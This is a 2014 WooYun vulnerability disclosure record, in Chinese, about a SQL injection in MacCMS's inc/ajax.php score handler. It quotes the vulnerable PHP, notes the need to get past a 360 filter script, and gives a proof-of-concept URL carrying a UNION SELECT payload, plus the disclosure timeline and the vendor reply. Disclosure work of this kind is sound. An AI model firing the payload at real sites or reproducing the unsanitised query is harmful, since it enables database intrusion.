{"id": 53850, "wybug_id": "wooyun-2014-066285", "wybug_title": "苹果CMS SQL注入一枚", "wybug_corp": "maccms.com", "wybug_author": "magerx", "wybug_date": "2014-06-27 19:01", "wybug_open_date": "2014-09-25 19:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向公众公开  简要描述： 看到之前一发路人甲的漏洞，厂商说未测试成功，我也换个地方试试 详细说明：   WooYun: 苹果CMS系统sql注入一枚 这个漏洞，厂商说未测试成功，然后继续换个地方看看。inc/ajax.php:123行\nelseif($ac=='score'){\tif($id<1){ echo \"err\"; return;}\t$score = intval(be(\"get\", \"score\"));\t$res = '{\"scoreall\":0,\"scorenum\":0,\"score\":0.0}';\tif($score<0) { $score = 0;} elseif( $score > 10) { $score = 10; }\tif($tab=='art') { $col='a'; } else { $col='d'; }\t\t$sql=\"SELECT \".$col.\"_score,\".$col.\"_scoreall,\".$col.\"_scorenum FROM {pre}\".$tab.\" WHERE \".$col.\"_id=\" .$id;\t$row=$db->getRow($sql);\tif($row){\t\t$d_score = $row[\"d_score\"];\t\t$d_scoreall = $row[\"d_scoreall\"];\t\t$d_scorenum = $row[\"d_scorenum\"];\t\t\t\tif($score>0){\t\t\tif(getCookie($tab.\"score\".$id)==\"ok\"){ echo \"haved\"; return;}\t\t\t$d_scoreall +=  $score;\t\t\t$d_scorenum++;\t\t\t$d_score = round( $d_scoreall / $d_scorenum ,1);\t\t\t$db->Update (\"{pre}vod\",array($col.\"_score\",$col.\"_scoreall\",$col.\"_scorenum\"),array($d_score,$d_scoreall,$d_scorenum),$col.\"_id=\".$id);\t\t\tsCookie ($tab.\"score\".$id,\"ok\");\t\t}\t\tif($d_score>10) { $d_score=10; }\t\t$res = '{\"scoreall\":'.$d_scoreall.',\"scorenum\":'.$d_scorenum.',\"score\":'.$d_score.'}';\t}\tunset ($row);\techo $res;}\n上面可以看到$id>=1,$tab可控，$score我们不用管,这时候我们让$col='d';table就必须是mac_vod了，所以这里只需要让360_safe3.php不拦截我们就可以注入了。因此这种注入应该还是需要从自身代码层杜绝，而不该依赖第三方防护脚本。直接注入肯定被拦截：\n\npoc:\nhttp://localhost/maccms/inc/ajax.php?ac=score&id=1&tab=vod union select/**/1,user(),3 from dual%23\n\n\n   漏洞证明：  看到厂商说没时间改代码了，看来还是不要继续看了～～\n\n   修复方案：  ～。～   版权声明：转载请注明来源 magerx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-06-27 21:25 厂商回复： 感谢您对苹果cms的测试，请在官方下载最新版本内测试。down点maccms点com 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}